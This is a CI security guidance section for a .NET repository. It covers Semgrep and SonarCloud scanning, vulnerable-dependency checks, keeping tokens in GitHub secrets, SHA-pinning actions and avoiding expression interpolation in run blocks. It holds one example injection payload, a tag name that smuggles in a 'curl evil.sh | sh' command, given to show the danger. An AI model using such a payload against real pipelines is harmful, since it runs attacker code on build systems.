## CI security & quality scanning

- Run on every push as GitHub Actions: `dotnet build` (warnings-as-errors) +
  `dotnet test`, **Semgrep**, and **SonarQube/SonarCloud** with the C# analyzer
  (`dotnet-sonarscanner begin/end` around the build so coverage + issues report).
- Run `dotnet list package --vulnerable --include-transitive` and fail the job on
  any known-vulnerable dependency.
- Email a findings summary on every run (e.g. via `dawidd6/action-send-mail` over
  SMTP) to the address in the `FINDINGS_EMAIL` Actions secret. It lives in a secret
  rather than the workflow YAML because this repo is public and a committed address
  gets scraped. Use glanceable circle indicators in the subject line:
    - 🟢  clean / no findings
    - 🟡  non-blocking findings
    - 🔴  blocking findings
    - ❗  scan error
- Keep all tokens (`SEMGREP_APP_TOKEN`, `SONAR_TOKEN`, `NUGET_API_KEY`, SMTP
  creds) and `FINDINGS_EMAIL` in GitHub Actions secrets, never in the workflow YAML.
  The human sets them with `gh secret set <NAME>`; they are never pasted into chat.
- A job whose secret is unset must **skip**, not fail. A red build for a missing
  optional token trains people to ignore red builds, which is worse than the scan
  it was meant to enforce.
- **Pin every action to a full 40-character commit SHA**, with the version in a
  trailing comment (`uses: actions/checkout@9c091bb... # v7.0.0`). A tag is mutable:
  the owner can repoint `@v7` at anything, and that is precisely how the
  `tj-actions/changed-files` and `trivy-action` compromises reached everyone
  downstream. A SHA cannot be repointed. Bump promptly if an action is deprecated,
  and re-resolve the SHA when you do.
- **Never interpolate `${{ }}` into a `run:` block.** Pass the value through `env:`
  and read it as a shell variable. Anything derived from a branch name, tag, title
  or comment is attacker-supplied text, and interpolation pastes it into the script
  before bash ever sees it: a tag named `'; curl evil.sh | sh; '` executes.
- Semgrep enforces both of the above, and caught both in this repo's own first
  workflow. If it fires on the CI config, fix the config; do not silence the rule.
